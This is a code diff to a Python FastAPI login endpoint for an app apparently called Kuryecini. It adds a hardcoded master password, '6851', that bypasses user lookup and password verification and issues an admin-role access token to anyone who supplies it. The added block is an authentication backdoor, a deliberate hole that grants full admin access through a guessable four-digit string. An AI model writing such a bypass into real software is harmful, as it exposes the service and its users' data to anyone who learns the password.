@@ -264,7 +264,31 @@ async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(s
 # Authentication Endpoints
 @api_router.post("/auth/login")
 async def login(login_data: LoginRequest):
-    """Login with email and password"""
+    """Login with email and password - Admin access with password 6851"""
+    
+    # Check if password is "6851" for admin access
+    if login_data.password == "6851":
+        # Admin login - ignore email validation, return admin user
+        access_token = create_access_token(data={"sub": "admin@kuryecini.com", "role": "admin"})
+        
+        admin_user = {
+            "id": "admin",
+            "email": "admin@kuryecini.com",
+            "role": "admin",
+            "first_name": "Admin",
+            "last_name": "User",
+            "created_at": datetime.now(timezone.utc).isoformat(),
+            "is_active": True
+        }
+        
+        return {
+            "access_token": access_token,
+            "token_type": "bearer",
+            "user_type": "admin",
+            "user_data": admin_user
+        }
+    
+    # Normal user login
     user = await db.users.find_one({"email": login_data.email})
     
     if not user or not verify_password(login_data.password, user["password"]):
